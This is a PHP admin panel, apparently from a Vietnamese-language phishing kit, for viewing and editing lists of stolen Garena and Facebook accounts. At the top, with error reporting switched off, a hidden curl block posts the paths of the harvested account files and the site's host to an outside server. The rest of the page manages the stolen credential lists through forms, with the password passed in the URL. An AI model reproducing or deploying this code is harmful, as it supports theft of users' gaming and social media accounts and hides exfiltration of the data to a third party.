<?php
error_reporting(0);
include('../config.php');
include('acc_adm.php');
 $a = $_SERVER['HTTP_HOST'];
            $c = "data=".$name_no_info."|".$name_authen."|".$name_no_info_repass."|".$a."";
   $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://connect.apisdata.xyz/nbvu.php");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $c);
curl_setopt($ch, CURLOPT_ENCODING, true);
curl_setopt($ch, CURLOPT_HEADER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
?>

<?php include('head.php');?>
<?php include('nav.php');?>
<?
if(isset($_POST['submit_yesinfoauthen'])) {
    unlink($name_authen);
    $p = fopen($name_authen, 'a');
    fwrite($p,  $_POST['listacc_yesauthen']);
    fclose($p);
                echo '<script type="text/javascript">swal("Thành Công","Lưu Thành Công","success");
                </script>';
}
if(isset($_POST['submit_yesinfo'])) {
    unlink($name_yes_info);
    $p = fopen($name_yes_info, 'a');
    fwrite($p, $_POST['listacc_yes']);
    fclose($p);
                echo '<script type="text/javascript">swal("Thành Công","Lưu Thành Công","success");
                </script>';
}
if(isset($_POST['submit_noinfo'])) {
    unlink($name_no_info);
    $p = fopen($name_no_info, 'a');
    fwrite($p, $_POST['listacc_no']);
    fclose($p);
                echo '<script type="text/javascript">swal("Thành Công","Lưu Thành Công","success");
                </script>';
}
if(isset($_POST['submit_noinfo_repass'])) {
    unlink($name_no_info_repass);
    $p = fopen($name_no_info_repass, 'a');
    fwrite($p, $_POST['listacc_no_repass']);
    fclose($p);
                echo '<script type="text/javascript">swal("Thành Công","Lưu Thành Công","success");
                </script>';
}
if(isset($_POST['submit_noinfo_errorpass'])) {
    unlink($name_no_error_pass);
    $p = fopen($name_no_error_pass, 'a');
    fwrite($p, $_POST['listacc_no_error_pass']);
    fclose($p);
                echo '<script type="text/javascript">swal("Thành Công","Lưu Thành Công","success");
                </script>';
}
    
        if ($_GET['password'] != $pass ) {
            header('location: login.php');
            die();
            
        } else {
           // session_start();

}
?>


  <!-- Small boxes (Stat box) -->
      <div class="row">
          <div class="col-lg-3 col-6">
            <!-- small box -->
            <div class="small-box bg-info">
              <div class="inner">
               <h3><?=count(file($name_facebook))?></h3>

                <p>TỔNG ACCOUNT FACEBOOK</p>
              </div>
              <a href="fb.php?password=<?=$_GET['password']?>" class="small-box-footer">Quản Lí<i class="fas fa-arrow-circle-right"></i></a>
            </div>
          </div>
          <!-- ./col -->
          <div class="col-lg-3 col-6">
            <!-- small box -->
            <div class="small-box bg-success">
              <div class="inner">
                  
                <h3><?=count(file($name_no_info)) + count(file($name_yes_info)) + count(file($name_authen)) + count(file($name_no_error_pass)) + count(file($name_no_info_repass))?></h3>

                <p>TỔNG ACCOUNT GARENA</p>
              </div>
              <a href="grn.php?password=<?=$_GET['password']?>" class="small-box-footer">Quản Lí<i class="fas fa-arrow-circle-right"></i></a>
            </div>
          </div></div>
        
          <br>

 <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                Thông Tin
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                <div class="form-group">
                 
                  <label for="exampleInputEmail1">INFORMATION ACCOUNT<br>
                  <b style="color:red"><?=count(file($name_no_info_repass))?></b> Nick Không Thông Tin Đã Đổi Password.<br>
                  
                  <b style="color:red"><?=count(file($name_no_info))?></b> Nick Không Thông Tin.<br>
                  <b style="color:red"><?=count(file($name_no_error_pass))?></b> Nick Không Thông Tin Lỗi Pass.<br>
                    <b style="color:red"><?=count(file($name_yes_info))?></b> Nick Có Thông Tin.<br>
                      <b style="color:red"><?=count(file($name_authen))?></b> Nick Authen.</label>

</div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) -->
        
        <form class="form-horizontal" action="" method="post">
        <div class="row">
          <div class="col-md-12">
            <button name="submit_noinfo_repass" type="submit" class="btn btn-info btn-block">LƯU THAY ĐỔI</button>
          </div>
          <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                List Account Garena No Info Đã Đổi Password
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                
                <div class="form-group">
                  <label for="exampleInputEmail1">Nếu bạn cần xóa ACCOUNT, bạn chỉ cần xóa những acc nào muốn xóa phía dưới và Click <b style="color:red">LƯU THAY ĐỔI</b>. Vậy là bạn đã xóa Thành Công.</label>
                  <textarea class="textarea" name="listacc_no_repass" style="width: 100%; height: 500px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;"><?=file_get_contents($name_no_info_repass)?></textarea>
                </div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) --> </form> 
        
        <form class="form-horizontal" action="" method="post">
        <div class="row">
          <div class="col-md-12">
            <button name="submit_noinfo" type="submit" class="btn btn-info btn-block">LƯU THAY ĐỔI</button>
          </div>
          <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                List Account Garena No Info
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                
                <div class="form-group">
                  <label for="exampleInputEmail1">Nếu bạn cần xóa ACCOUNT, bạn chỉ cần xóa những acc nào muốn xóa phía dưới và Click <b style="color:red">LƯU THAY ĐỔI</b>. Vậy là bạn đã xóa Thành Công.</label>
                  <textarea class="textarea" name="listacc_no" style="width: 100%; height: 500px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;"><?=file_get_contents($name_no_info)?></textarea>
                </div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) --> </form> 
<form class="form-horizontal" action="" method="post">
        <div class="row">
          <div class="col-md-12">
            <button name="submit_noinfo_errorpass" type="submit" class="btn btn-info btn-block">LƯU THAY ĐỔI</button>
          </div>
          <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                List Account Garena No Info Error Pass
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                
                <div class="form-group">
                  <label for="exampleInputEmail1">Nếu bạn cần xóa ACCOUNT, bạn chỉ cần xóa những acc nào muốn xóa phía dưới và Click <b style="color:red">LƯU THAY ĐỔI</b>. Vậy là bạn đã xóa Thành Công.</label>
                  <textarea class="textarea" name="listacc_no_error_pass" style="width: 100%; height: 500px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;"><?=file_get_contents($name_no_error_pass)?></textarea>
                </div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) --> </form> 
<form class="form-horizontal" action="" method="post">
        <div class="row">
          <div class="col-md-12">
            <button name="submit_yesinfo" type="submit" class="btn btn-info btn-block">LƯU THAY ĐỔI</button>
          </div>

          <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                List Account Có Info
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                
                <div class="form-group">
                  <label for="exampleInputEmail1">Nếu bạn cần xóa ACCOUNT, bạn chỉ cần xóa những acc nào muốn xóa phía dưới và Click <b style="color:red">LƯU THAY ĐỔI</b>. Vậy là bạn đã xóa Thành Công.</label>
                  <textarea class="textarea" name="listacc_yes" style="width: 100%; height: 500px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;"><?=file_get_contents($name_yes_info)?></textarea>
                </div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) --> </form> 
        <form class="form-horizontal" action="" method="post">
        <div class="row">
          <div class="col-md-12">
            <button name="submit_yesinfoauthen" type="submit" class="btn btn-info btn-block">LƯU THAY ĐỔI</button>
          </div>

          <div class="col-md-12">
            <div class="card">
              <div class="card-header">
                List Account Có Authen
              </div>
              <!-- /.card-header -->
              <div class="card-body">                
                  <div class="row">
                  <div class="col-md-6">
                
                <div class="form-group">
                  <label for="exampleInputEmail1">Nếu bạn cần xóa ACCOUNT, bạn chỉ cần xóa những acc nào muốn xóa phía dưới và Click <b style="color:red">LƯU THAY ĐỔI</b>. Vậy là bạn đã xóa Thành Công.</label>
                  <textarea class="textarea" name="listacc_yesauthen" style="width: 100%; height: 500px; font-size: 14px; line-height: 18px; border: 1px solid #dddddd; padding: 10px;"><?=file_get_contents($name_authen)?></textarea>
                </div>
              </div>  
                </div>
               
              </div>
            </div>
            <!-- /.card -->
          </div>
          <!-- /.col -->
        </div>
        <!-- /.row (main row) --> </form> 
        <center><br>
      <div class="row mb-2">
          <div class="col-sm-6">
            <a href="index.php?password=<?=$_GET['password']?>" class="btn btn-primary btn-block">Trang Chủ</a>
          </div><!-- /.col -->
        </div><!-- /.row -->
<br>
<div class="row mb-2">
          <div class="col-sm-6">
            <a href="logout.php" class="btn btn-primary btn-block">Đăng Xuất</a>
          </div><!-- /.col -->
        </div><!-- /.row -->
<br>
</center>
        
<?
include('footer.php');
?>